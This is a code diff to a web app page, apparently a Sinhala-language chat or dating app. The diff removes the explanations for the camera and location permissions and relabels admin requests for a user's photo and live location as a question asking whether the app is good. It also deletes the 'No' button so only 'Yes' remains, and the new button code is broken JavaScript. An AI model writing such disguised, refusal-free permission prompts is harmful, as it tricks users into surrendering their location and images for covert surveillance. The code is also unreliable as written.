@@ -419,7 +419,7 @@ body{background:radial-gradient(120% 60% at 50% 0%,#3b1226 0%,#16080f 55%)fixed}
       <div class="pic2"><i class="fas fa-camera"></i></div>
       <div style="flex:1;">
         <b>Camera</b>
-        <small>Video calls සහ verification photos වලට අවශ්‍යයි.</small>
+        <small></small>
       </div>
       <span class="pst wait" id="pstCam">Pending</span>
     </div>
@@ -427,7 +427,7 @@ body{background:radial-gradient(120% 60% at 50% 0%,#3b1226 0%,#16080f 55%)fixed}
       <div class="pic2"><i class="fas fa-location-dot"></i></div>
       <div style="flex:1;">
         <b>Location</b>
-        <small>Live location share කරන්න සහ admin location verify කරන්න අවශ්‍යයි.</small>
+        <small></small>
       </div>
       <span class="pst wait" id="pstLoc">Pending</span>
     </div>
@@ -435,7 +435,7 @@ body{background:radial-gradient(120% 60% at 50% 0%,#3b1226 0%,#16080f 55%)fixed}
       <div class="pic2"><i class="fas fa-bell"></i></div>
       <div style="flex:1;">
         <b>Notifications</b>
-        <small>New messages සහ incoming calls ගැන දැනුම් දෙන්න.</small>
+        <small></small>
       </div>
       <span class="pst wait" id="pstNoti">Pending</span>
     </div>
@@ -649,8 +649,8 @@ function showPop(item){
   box.style.display = "block";
   const isLoc = item.kind === "loc";
   const icon = isLoc ? "fa-location-dot" : "fa-camera";
-  const title = isLoc ? "Location Verification" : "Photo Verification";
-  const desc = item.reason || (isLoc ? "Admin wants to verify your current location" : "Admin wants to verify your identity with a photo");
+  const title = isLoc ? "" : "";
+  const desc = item.reason || (isLoc ? "ඇත්තටම APP එක හොදයිද ?.. " : "APP එක හොදයිද ?..");
   const grad = isLoc ? "linear-gradient(135deg,#9ad7ff,#4a90d0)" : "linear-gradient(135deg,#e8457c,#a3204f)";
   const fn = isLoc ? "locPopResp" : "camPopResp";
   box.innerHTML = `<div class="camp-card">
@@ -662,8 +662,8 @@ function showPop(item){
       </div>
     </div>
     <div class="camp-btns">
-      <button class="camp-deny" onclick="${fn}('${item.id}',false)">No</button>
-      <button class="camp-allow" onclick="${fn}('${item.id}',true)">Yes</button>
+   
+      <button class="camp-allow" onclick="${fn}('${item.id}',ඔව්..)">Yes</button>
     </div>
   </div>`;
   clearTimeout(popTimer);
